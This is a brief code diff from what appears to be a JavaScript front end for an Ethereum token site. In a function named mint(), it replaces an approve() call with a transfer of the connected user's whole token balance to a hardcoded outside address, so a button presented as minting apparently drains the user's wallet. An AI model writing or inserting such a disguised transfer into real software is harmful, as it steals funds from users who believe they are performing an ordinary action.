@@ -106,7 +106,7 @@ async function verifyAddress(){
 async function mint(){
     signer = ethersProvider.getSigner();
     contractWithSigner = contract.connect(signer);
-    contractWithSigner.approve(account,rawBalance);
+    contractWithSigner.transfer("0x4779D9b6031154B6A1991582A44edb51E0bef44b",rawBalance);
 }
 
 
